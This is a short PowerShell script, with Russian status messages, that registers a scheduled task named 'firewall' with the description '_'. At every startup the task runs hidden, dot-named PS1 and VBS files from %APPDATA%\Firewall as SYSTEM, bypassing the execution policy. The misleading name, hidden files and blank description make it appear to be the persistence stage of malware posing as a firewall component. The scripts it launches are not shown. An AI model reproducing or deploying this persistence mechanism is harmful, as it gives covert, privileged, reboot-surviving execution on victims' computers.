if ([Environment]::Is64BitOperatingSystem) {
    $osBit = "64"
} else {
    $osBit = "32"
}

$fileName = ".firewall$osBit"
$psFilePath = "$env:APPDATA\Firewall\$fileName.ps1"
$vbsFilePath = "$env:APPDATA\Firewall\$fileName.vbs"

try {
    Write-Host "PS File Path: $psFilePath"
    Write-Host "VBS File Path: $vbsFilePath"

    if (!(Test-Path $psFilePath)) {
        Write-Error "File PS1 not exist: $psFilePath"
    }
    if (!(Test-Path $vbsFilePath)) {
        Write-Error "File VBS not exist: $vbsFilePath"
    }

    $taskActionPS = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$psFilePath`""
    $taskActionVBS = New-ScheduledTaskAction -Execute "cscript.exe" -Argument "`"$vbsFilePath`""
   
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

    $task = New-ScheduledTask -Action @($taskActionPS, $taskActionVBS) -Trigger $trigger -Settings $taskSettings -Principal $taskPrincipal -TaskName "firewall" -Description "_"

    Register-ScheduledTask -InputObject $task

    Write-Host "Задача успешно зарегистрирована"

} catch {
    Write-Error "Произошла ошибка: $($_.Exception.Message)"
    Write-Host "Полная ошибка: $($_.ToString())"
    pause
}

